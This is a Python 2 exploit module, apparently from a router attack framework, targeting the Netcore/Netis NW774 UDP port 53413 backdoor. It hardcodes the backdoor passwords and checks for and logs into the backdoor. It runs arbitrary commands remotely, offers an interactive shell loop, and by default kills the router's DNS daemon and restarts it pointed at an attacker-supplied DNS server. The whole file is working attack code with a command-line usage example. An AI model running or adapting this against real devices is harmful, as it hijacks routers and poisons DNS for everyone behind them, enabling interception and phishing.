#coding: utf-8
'''
@Test list:
NW774
'''
from routelib import *
from exp_template import *
import socket
import struct

class Level(Enum):
    info = 0
    debug = 1
    error = 2
    warming = 3
    success = 4

level_string = ['[Info]', '[Debug]', '[Error]', '[Warming]', '[Success]']
    
class netcore_backdoor(Exploit):
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        self.url = url
        self.taskid = taskid
        self.targetid = targetid
        self.cmd_connect = cmd_connect
        self.data_redirect = data_redirect
        self.dns_server = dns_server
        self.proxies = proxies
        self.log_data = []
        self.shell_data = []
        self.backdoor_port = 53413
        self.is_logined = False
        
    def meta_info(self):
        return {
            'name': 'netcore_backdoor',
            'author': 'z',
            'date': '2018-05-2',
            'attack_type': 'RCE',
            'app_type': 'Router',              #路由器为Router
            'app_name': 'netcore',
            'min_version': '',
            'max_version': '',
            'version_list': ['netcore nw774'],             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Netcore and Netis have a wide-open backdoor that can be easily exploited.UDP port 53413',
            'reference':[
                'me',
            ],   #参考文档
        }
        
    def exploit(self):
        if self.check():
            self.report("Target is vulnerable")
            self.report("DNS Poisoning...")
            #self.command_stager()
            self.dns_poison(self.dns_server)
        else:
            self.report("Target is not vulnerable",Level.warming)
        self.report('Exploit is complete')

    def dns_poison(self,new_dns_server='192.168.220.5', dns_conf_path='/var/servd/DNS.conf', restart_cmd='"dnsmasq -C /var/servd/DNS.conf"'):
        kill = 'killall dnrd'
        cmd = 'dnrd --cache=off -s{} -s{}'.format(new_dns_server,new_dns_server)
        self.report('Stop dns server done',Level.info)
        self.execute(kill)
        self.report('Start dns server done',Level.info)
        self.execute(cmd)
        return True

    def command_stager(self):
        while True:
            cmd = raw_input('# ')
            if not cmd:
                break
            if cmd in ['exit', 'quit']:
                return
            self.report(self.execute(cmd))

    def execute(self, cmdstring):
        tinfo = get_iport_from_url(self.url)

        if tinfo is None:
            self.report("Get target info from url error",Level.error)
            return False
        target = (tinfo[0],self.backdoor_port)
        if not self.is_logined:
            self.login(target)
        if cmdstring[0] == '$' or cmdstring[0] == '?':
            return self.do_mptfun(cmdstring,target)
        else:
            return self.do_syscmd(cmdstring,target)

    def check(self):
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.settimeout(1)
        data = "pa"+"\x00\x00"+"word"+"n4tc0re"
        tinfo = get_iport_from_url(self.url)

        if tinfo is None:
            self.report("Get target info from url error",Level.error)
            return False
        target = (tinfo[0],self.backdoor_port)
        sock.sendto(data,target)
        try:
            data,ADDR = sock.recvfrom(1024)
            if data is not None and 'Login incorrect' in data and data[2:4] == '\x00\x06':
                return True
            elif data[2:4] == '\x00\x05' and data[8:12] == '\x00\x00\x00\xff':
                self.report('Anyone Logined in',Level.warming)
                self.is_logined = True
                return True
        except:
            self.report('Check exception.',Level.warming)
        return False

    def login(self,target):
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.settimeout(1)
        data = "pa"+"\x00\x00"+"word"+"netcore"
        #target = (ip,port)
        sock.sendto(data,target)
        try:
            data,ADDR = sock.recvfrom(1024)
            if 'success' in data:
                self.report('Valid current password, we logged in.',Level.info)
                self.is_logined = True
            elif len(data) >= 12:
                self.report('You are currently logged in.',Level.info)
        except:
            self.report('heck your network,disconnected...',Level.warming)

    def do_syscmd(self,cmdstring,target):
        SHELL = 0
        FILEEND = 5
        cmd = SHELL
        HEAD = "pa"+struct.pack(">H",cmd)+"word"
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

        sock.sendto(HEAD+cmdstring,target)
        data = ''
        while True:
            dr,ADDR = sock.recvfrom(0x4000)
            cmd = FILEEND
            endflag = struct.pack(">H",cmd)

            if not dr:
                break
            if endflag in dr[:8]:
                #import binascii
                #print binascii.b2a_hex(dr)
                break
            data += dr[len("password"):]

        sock.close()


        if data is None:
            return ''

        d = data.replace('\r','').replace('\n','')
        if len(d) < 2:
            return ''
        #print data
        return data

    def do_mptfun(self,cmdstring,target):
        SHELL = 0
        cmd = SHELL
        HEAD = "pa"+struct.pack(">H",cmd)+"word"
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

        sock.sendto(HEAD+cmdstring,target)
        dr,ADDR = sock.recvfrom(0x4000)

        sock.close()

        return dr[12:]
        
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): dir_300_600_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = netcore_backdoor(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()
    #print get_iport_from_url('http://192.168.10.1/aa')
    #print get_iport_from_url('http://192.168.10.1')
    #print get_iport_from_url('https://192.168.10.1')
    #print get_iport_from_url('http://192.168.10.1:9090')
    #print get_iport_from_url('https://192.168.10.1:8976')

        
        
        
        
        
